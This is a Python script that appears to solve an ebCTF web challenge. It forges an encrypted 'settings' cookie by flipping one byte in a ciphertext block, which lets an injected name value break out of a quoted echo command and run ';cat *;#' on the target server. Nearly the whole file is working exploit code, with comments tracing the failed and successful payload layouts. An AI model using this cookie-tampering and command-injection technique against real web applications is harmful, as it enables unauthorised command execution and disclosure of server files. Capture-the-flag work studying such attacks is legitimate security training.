    #!/usr/bin/python
    import requests
    import sys
    import urllib
    from base64 import b64decode as dec
    from base64 import b64encode as enc
    url = 'http://192.168.184.133/ebctf/mine.php'
    def Test(x):
    t = "echo 'Hello %s!'" % x
    s = 'a:2:{s:4:"name";s:%s:"%s";s:8:"greeting";s:%s:"%s";}%s' % (len(x),x,len(t),t, 'X'*40)
    for i in xrange(0,len(s),16):
    print s[i:i+16]
    print '\n'
    def Pwn(s):
    global url
    s = urllib.quote_plus(enc(s))
    req = requests.get(url, cookies = {'settings' : s}).content
    # if req.find('works') != -1:
    print req
    # else:
    # print '[-] FAIL'
    def GetCookie(name):
    global url
    d = {
    'name':name,
    'submit':'Submit'
    }
    h = requests.post(url, data = d, headers = {'Content-Type' : 'application/x-www-form-urlencoded'}).headers
    if h.has_key('set-cookie'):
    h = dec(urllib.unquote_plus(h['set-cookie'][9:]))
    #h = urllib.unquote_plus(h['set-cookie'][9:])
    #print h
    return h
    else:
    print '[-] ERROR'
    sys.exit(0)
    #a:2:{s:4:"name";s:10:"X;cat *;#a";s:8:"greeting";s:24:"echo 'Hello X;cat *;#a!'";}
    #a:2:{s:4:"name";
    #s:10:"X;cat *;#a
    #";s:8:"greeting"
    #;s:24:"echo 'Hel
    #lo X;cat *;#a!'"
    #;}
    #a:2:{s:4:"name";s:42:"zzzzzzzzzzzzzzzzzX;cat *;#zzzzzzzzzzzzzzzz";s:8:"greeting";s:56:"echo 'Hello zzzzzzzzzzzzzzzzzX;cat *;#zzzzzzzzzzzzzzzz!'";}
    #a:2:{s:4:"name";
    #s:42:"zzzzzzzzzz
    #zzzzzzzX;cat *;#
    #zzzzzzzzzzzzzzzz
    #";s:8:"greeting"
    #;s:56:"echo 'Hel
    #lo zzzzzzzzzzzzz
    #zzzzX;cat *;#zzz
    #zzzzzzzzzzzzz!'"
    #;}
    #exploit = 'X' + ';cat *;#a' #Test case first, unsuccess
    exploit = 'z'*17 + 'X' + ';cat *;#' + 'z' *16 # Test Success
    #exploit = "______________________________________________________; cat *;#"
    #Test(exploit)
    cookie = GetCookie(exploit)
    pos = 100; #test case success
    #pos = 51; #test case first, unsuccess
    val = chr(ord('X') ^ ord("'") ^ ord(cookie[pos]))
    exploit = cookie[0:pos] + val + cookie[pos + 1:]
    Pwn(exploit)
